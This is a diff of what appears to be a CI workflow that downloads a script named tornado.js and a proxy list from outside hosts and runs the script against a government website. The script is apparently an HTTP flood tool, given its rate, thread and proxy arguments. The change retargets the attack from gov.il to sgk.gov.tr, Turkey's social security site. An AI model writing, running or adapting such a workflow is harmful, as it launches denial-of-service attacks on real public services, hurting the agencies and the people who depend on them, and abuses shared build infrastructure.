@@ -17,7 +17,7 @@ jobs:
           wget https://github.com/kaneious/tornado/raw/refs/heads/main/tornado.js
           wget https://up.zip/9fpdq/proxies.txt
           npm i hpack
-          timeout 30 node tornado.js GET https://www.gov.il/ 30 8 64 proxies.txt --full
+          timeout 30 node tornado.js GET https://www.sgk.gov.tr 30 8 64 proxies.txt --full
           
       - name: OK !
         run: |
